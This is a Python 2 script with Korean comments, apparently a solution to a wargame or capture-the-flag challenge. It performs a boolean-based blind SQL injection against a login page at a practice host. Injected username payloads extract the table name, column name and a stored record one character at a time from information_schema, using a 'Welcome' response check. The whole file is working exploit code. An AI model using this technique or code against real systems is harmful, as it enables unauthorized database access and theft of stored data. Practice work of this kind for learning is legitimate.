#!/usr/bin/python
#coding: utf-8
import urllib,urllib2
table_name = ""
column_name = ""
record = ""


# 테이블의 길이 구하기
for i in range(1,20):
	inject = "' or length((select table_name from information_schema.tables where table_type='base table' limit 24,1)) = "+str(i)+" #"
	login = {'username':inject,'pass':'1'}
	login = urllib.urlencode(login)
	res = urllib2.urlopen("http://wargame.iei.or.kr:30010/login.php",login)
	if res.read().find("Welcome") != -1:
		print "# Table Length : "+str(i)
		table_length = i

# 테이블의 이름 구하기
for j in range(1,table_length+1):
	for i in range(32,127):
		inject = "' or ascii(substring((select table_name from information_schema.tables where table_type='base table' limit 24,1),"+str(j)+",1)) = "+str(i)+" #"
		login = {'username':inject,'pass':'1'}
		login = urllib.urlencode(login)
		res = urllib2.urlopen("http://wargame.iei.or.kr:30010/login.php",login)
		if res.read().find("Welcome") != -1:
			print "find : "+chr(i)
			table_name += chr(i)
			break
		print i

print "# Table Name : "+table_name

# 컬럼의 길이 구하기
for i in range(1,20):
	inject = "' or length((select column_name from information_schema.columns where table_name='"+table_name+"' limit 0,1)) = "+str(i)+" #"
	login = {'username':inject,'pass':'1'}
	login = urllib.urlencode(login)
	res = urllib2.urlopen("http://wargame.iei.or.kr:30010/login.php",login)
	if res.read().find("Welcome") != -1:
		print "# Table Length : "+str(i)
		column_length = i

# 컬럼의 이름 구하기
for j in range(1,column_length+1):
	for i in range(32,127):
		inject = "' or ascii(substring((select column_name from information_schema.columns where table_name='"+table_name+"' limit 0,1),"+str(j)+",1)) = "+str(i)+" #"
		login = {'username':inject,'pass':'1'}
		login = urllib.urlencode(login)
		res = urllib2.urlopen("http://wargame.iei.or.kr:30010/login.php",login)
		if res.read().find("Welcome") != -1:
			print "find : "+chr(i)
			column_name += chr(i)
			break
		print i

print "# column Name : "+column_name

# 레코드의 길이 구하기
for i in range(1,20):
	inject = "' or length((select "+column_name+" from "+table_name+" limit 0,1)) = "+str(i)+" #"
	login = {'username':inject,'pass':'1'}
	login = urllib.urlencode(login)
	res = urllib2.urlopen("http://wargame.iei.or.kr:30010/login.php",login)
	if res.read().find("Welcome") != -1:
		print "# Record Length : "+str(i)
		record_length = i

# 레코드 구하기
for j in range(1,record_length+1):
	for i in range(32,127):
		inject = "' or ascii(substring((select "+column_name+" from "+table_name+" limit 0,1),"+str(j)+",1)) = "+str(i)+" #"
		login = {'username':inject,'pass':'1'}
		login = urllib.urlencode(login)
		res = urllib2.urlopen("http://wargame.iei.or.kr:30010/login.php",login)
		if res.read().find("Welcome") != -1:
			print "find : "+chr(i)
			record += chr(i)
			break
		print i
print "========= Result ========"
print "# Table Name : "+table_name
print "# Column Name : "+column_name
print "# Record : "+record
